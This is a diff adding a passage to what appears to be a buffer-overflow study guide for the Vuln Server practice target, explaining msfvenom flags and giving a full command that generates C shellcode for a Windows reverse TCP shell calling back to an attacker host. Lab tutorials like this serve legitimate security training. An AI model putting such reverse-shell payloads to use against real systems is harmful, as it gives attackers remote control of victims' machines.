@@ -891,6 +891,25 @@ while True:
 
 ### Generating and Gaining Shells
 
+- We going to use `msfvenom` by `metasploit` to generate a payload
+
+- Just like all the payloads generated in `msfvenom`, but I will mention this specific flags:
+
+    - `-p windows/shell_reverse_tcp` = type of shell/payload
+    - `LHOST` & `LPORT` = LOCAL>Attacker (Kali)
+    - ![image](https://user-images.githubusercontent.com/94720207/169419352-75669845-c6a1-458f-be9a-25a409d2241c.png)
+    - `EXITFUNC=thread` =  More stable shell
+    - `-f c` = File type C (C language)
+    - `-a x86` = Architecture x86
+    
+    - **`-b "\x00"` bad characters!!!** 
+
+        - Remeber, Vuln Server does not have `badchars` so, in this case, we only will use x00 Null Byte as a badchar.
+        - Otherwise, add the other `badchar` here!
+    
+    - **Command:**
+    
+    - **`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.66 LPORT=4444 EXITFUNC=thread -f c -a x86`**   
 
         
 
